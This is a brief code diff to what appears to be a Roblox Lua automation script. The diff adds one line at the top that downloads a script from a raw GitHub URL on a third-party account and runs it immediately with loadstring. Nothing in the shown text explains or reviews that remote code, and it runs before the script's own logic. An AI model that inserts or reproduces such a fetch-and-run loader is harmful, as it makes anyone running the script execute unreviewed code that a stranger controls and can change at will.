@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/suka11567-coder/FixzHub/refs/heads/main/welcome"))()
 local VirtualUser = game:GetService("VirtualUser")
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
